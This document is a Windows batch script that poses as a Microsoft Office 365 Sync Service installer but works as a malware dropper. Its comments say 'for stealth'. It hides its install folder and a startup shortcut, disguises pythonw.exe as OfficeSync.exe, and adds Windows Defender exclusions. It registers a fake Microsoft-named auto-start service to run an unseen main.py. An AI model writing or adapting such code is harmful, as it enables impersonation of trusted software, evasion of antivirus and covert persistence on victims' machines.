@echo off
:: Microsoft Office 365 Sync Service Installer v1.0.1
:: Simple one-click installation for Windows

title Microsoft Office 365 Setup
color 0A

echo.
echo ========================================
echo   Microsoft Office 365 Sync Service
echo ========================================
echo.

:: Check admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] This installer requires Administrator privileges.
    echo.
    echo Right-click on INSTALL.bat and select "Run as administrator"
    echo.
    pause
    exit /b 1
)

echo [1/5] Checking system...
where python >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Python is not installed or not in PATH
    echo.
    echo Please install Python 3.6+ from: https://www.python.org/downloads/
    echo Make sure to check "Add Python to PATH" during installation
    echo.
    pause
    exit /b 1
)

echo [2/5] Creating installation directory...
:: Generate random folder name for stealth
set /a RAND_NUM=%RANDOM% %% 9999 + 1000
set INSTALL_DIR=C:\ProgramData\Microsoft\Office365Sync_%RAND_NUM%
if exist "%INSTALL_DIR%" (
    echo     Backing up existing installation...
    move "%INSTALL_DIR%" "%INSTALL_DIR%.backup.%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%" >nul 2>&1
)
mkdir "%INSTALL_DIR%" 2>nul

:: Hide the directory
attrib +h +s "%INSTALL_DIR%"

:: Save install path for later use
echo %INSTALL_DIR%> "%TEMP%\office365_path.txt"

echo [3/5] Copying client files...
xcopy /E /I /Y "client\*" "%INSTALL_DIR%" >nul
if %errorLevel% neq 0 (
    echo [ERROR] Failed to copy files
    pause
    exit /b 1
)

echo [4/5] Installing Python dependencies...
cd /d "%INSTALL_DIR%"

:: Copy pythonw.exe with disguised name
where pythonw.exe >nul 2>&1
if %errorLevel% equ 0 (
    for /f "delims=" %%i in ('where pythonw.exe') do (
        copy "%%i" "%INSTALL_DIR%\OfficeSync.exe" >nul 2>&1
        goto :found_python
    )
)
:found_python

python -m pip install --quiet --upgrade pip
python -m pip install --quiet -r requirements.txt
if %errorLevel% neq 0 (
    echo [WARNING] Some dependencies failed to install
    echo The client will try to auto-install them on first run
)

echo [5/5] Setting up auto-start...

:: Add Windows Defender exclusion for stealth
echo     Adding Windows Defender exclusions...
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" 2>nul
powershell -Command "Add-MpPreference -ExclusionProcess 'OfficeSync.exe'" 2>nul
powershell -Command "Add-MpPreference -ExclusionProcess 'pythonw.exe'" 2>nul

:: Register as Windows Service using sc
echo     Registering Windows service...
sc create "Office365Sync" binPath= "\"%INSTALL_DIR%\OfficeSync.exe\" \"%INSTALL_DIR%\main.py\"" start= auto DisplayName= "Microsoft Office 365 Sync Service" >nul 2>&1
sc description "Office365Sync" "Synchronizes Microsoft Office 365 data and settings" >nul 2>&1
sc config "Office365Sync" start= delayed-auto >nul 2>&1

:: Fallback: Create hidden startup shortcut if service fails
set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
powershell -Command "$WS = New-Object -ComObject WScript.Shell; $SC = $WS.CreateShortcut('%STARTUP_DIR%\OfficeSync.lnk'); $SC.TargetPath = '%INSTALL_DIR%\OfficeSync.exe'; $SC.Arguments = '%INSTALL_DIR%\main.py'; $SC.WorkingDirectory = '%INSTALL_DIR%'; $SC.WindowStyle = 7; $SC.Save()"
attrib +h "%STARTUP_DIR%\OfficeSync.lnk"

:: Start the service
echo.
echo Starting sync service...
sc start "Office365Sync" >nul 2>&1
if %errorLevel% neq 0 (
    :: Fallback to direct execution if service fails
    start /B "%INSTALL_DIR%\OfficeSync.exe" "%INSTALL_DIR%\main.py"
)

echo.
echo ========================================
echo   Installation Complete!
echo ========================================
echo.
echo Microsoft Office 365 Sync Service installed
echo Service is now running in the background
echo It will start automatically on system boot
echo.
pause
